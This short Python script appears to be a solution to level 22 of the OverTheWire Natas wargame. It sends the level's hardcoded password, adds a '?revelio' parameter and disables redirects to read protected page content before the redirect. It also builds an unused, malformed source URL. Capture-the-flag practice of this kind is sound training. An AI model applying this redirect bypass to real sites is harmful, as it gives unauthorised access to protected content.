import requests, html

base_url = "http://natas22.natas.labs.overthewire.org/?revelio"
source_url = base_url + "index-source.html"

s = requests.session()

username = "natas22"
password = "91awVM9oDiUGm33JdzM7RVLBS8bz9n0s"

res1 = s.get(base_url, auth=(username, password), allow_redirects=False)

print(html.unescape(res1.text))
print("="*80)
# sessid = res1.cookies["PHPSESSID"]
print(res1.headers.get("location"))
# print(sessid)
print("="*80)
